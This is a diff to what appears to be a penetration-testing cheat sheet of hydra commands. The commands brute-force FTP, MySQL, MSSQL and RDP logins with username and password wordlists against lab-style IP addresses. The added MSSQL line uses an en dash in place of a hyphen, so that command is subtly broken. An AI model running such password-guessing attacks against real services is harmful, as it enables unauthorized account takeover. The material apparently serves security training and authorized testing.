@@ -10,6 +10,10 @@ hydra -L users.list -P passwords.list ftp://10.129.203.6 -s 2121 -t 4
 ```
 hydra -L usernames.txt -P pass.txt <ip> mysql
 ```
+### MSSQL
+```
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
+```
 ### RDP
 ```shell
 hydra -L user.list -P password.list rdp://10.129.42.197
